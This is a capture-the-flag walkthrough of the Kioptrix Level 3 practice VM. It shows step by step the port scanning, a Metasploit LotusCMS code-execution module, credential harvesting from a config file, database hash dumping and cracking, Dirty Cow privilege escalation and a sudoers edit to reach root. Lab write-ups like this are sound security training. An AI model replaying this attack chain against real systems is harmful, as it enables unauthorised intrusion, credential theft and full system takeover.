# Kioptrix Level 3

### Contents
<!-- TOC -->
- [Footprinting](#footprinting)
- [Reconnaisance](#reconnaisance)
  - [HTTP](#http)
  - [phpMyAdmin](#phpmyadmin)
  - [LotusCMS](#lotuscms)
- [Initial Shell](#initial-shell)
- [Privilege Escalation I](#privilege-escalation-i)
  - [Cracking Hashes](#cracking-hashes)
- [Privilege Escalation II](#privilege-escalation-ii)
  - [Alternative Routes](#alternative-routes)
- [References](#references)

<!-- /TOC -->

Our target network is `10.0.2.0/24`.

# Footprinting
Find the IP address of the target host via:

```bash
netdiscover -r 10.0.2.0/24
```

For the purpose of this guide we will assume our target is at IP address **10.0.2.9**.

As per the instructions we modify `/etc/hosts` so our target is at **kioptrix3.com**.
# Reconnaisance

We perform an initial scan as follows:

```bash
nmap 10.0.2.9
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
MAC Address: 08:00:27:50:6F:FB (Oracle VirtualBox virtual NIC)
```

Let's check for UDP ports:

```bash
nmap -sU 10.0.2.9
```

Let's do version detection:
```bash
nmap -O 10.0.2.9
```

```
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
```

Now we proceed by examining each of the services on the machine.
Starting with the most interesting.

## HTTP

```bash
nikto -host kioptrix3.com
```

We find a **phpmyadmin** page.

## phpMyAdmin

```
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7444 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-03-06 11:22:36 (GMT-5) (46 seconds)
```

When we navigate to the admin console via the browser we find we try the following:

```
root:
admin:admin
':
```

This works and we are logged in as `'@localhost`.

The console gives the following information:

```
Server version: 5.0.51a-3ubuntu5.4
phpMyAdmin - 2.11.3deb1ubuntu1.3
MySQL client version: 5.0.51a
```

We can see the following database:
```
information_schema
```
However, at this stage we are unable to use any SQL injection at our current low privilege level.

## LotusCMS

Browsing around the site we can see a blog and a login portal.

The portal states that it is:
> Proudly powered by LotusCMS

A simple `searchsploit` on this CMS reveals the following:
https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec.

We used Metasploit to gain a Meterpreter shell like follows:

```
use exploit/multi/http/lcms_php_exec
set RHOST kioptrix3.com
set URI /index.php?system=Admin
exploit
```

# Initial Shell

```
meterpreter > getuid
Server username: www-data (33)

meterpreter > cat /etc/passwd
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash

meterpreter > sysinfo
Computer    : Kioptrix3
OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
Meterpreter : php/linux
```

Looking at the PHP files we can see some of the config files. Of interest is `gconfig.php` which contains some GLOBALS:

```PHP
$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

Looking around the filesystem we can see some interesting files in the home of user `loneferret`.

```bash
cat /home/loneferret/CompanyPolicy.README
```

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

# Privilege Escalation I

We can see the daemon running:

```
/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --port=3306
```

Using `root:fuckeyou` we can login to the database using `mysql`.

```
mysql -u root -p --port=3306
```

Doing this via Meterpreter we need to use `shell`.
This did cause difficulties in terms of output being unreliable to the screen, however using `; ?` seemed to work.

Now we can run some commands on the Database:

```SQL
USE DATABASE MYSQL;
SELECT * FROM users;
```

```
localhost	root	*47FB3B1E573D80F44CD198DC65DE7764795F948E
```

```SQL
USE DATABASE gallery;
SELECT * FROM dev_accounts;
```

| id | username   | password                         |
|----|------------|----------------------------------|
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |

**Now we have some account hashes to crack.**

## Cracking Hashes

We put our hashes in a file and let `john` loose:

```bash
john hashes.txt --format=Raw-MD5
```

We find `loneferret:starwars` pretty quickly.

We can then `ssh` into `loneferret@kioptrix3.com`.

# Privilege Escalation II

Based upon the Linux version we can see it is vulnerable to:
https://www.exploit-db.com/exploits/40839, also known as **Dirty Cow**.

We download the exploit onto Kali and then simply `scp` it across:

```bash
scp dirty.c loneferret@kioptrix3.com:/home/loneferret
```

We modified `dirty.c` so that we added a new user called `john`.

```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

```
etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
john:jobbj4Fd7EAng:0:0:pwned:/root:/bin/bash

mmap: b7fe0000
```

We can login as `john`:

```bash
su john
john@Kioptrix3:~
cat Congrats.txt
```

```
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.
```

## Alternative Routes

We took a slight shortcut here using Dirty Cow, other routes exist.

The primary alternative is to use the `ht` program mentioned in the README.

Using `sudo ht` we can edit and read any file. For example, we could have edited `sudoers` to gain root as follows:

```bash
sudo ht /etc/sudoers
```

Then make sure the existing `loneferret` line looks like:

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/sh
```

The simply:

```bash
sudo /bin/sh
```

# References


[Computerphile Dirty Cow Explanation](https://www.youtube.com/watch?v=CQcgz43MEZg)

[Shadow file formats](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)

[Configuring the sudoers file](https://www.linux.com/blog/configuring-linux-sudoers-file)
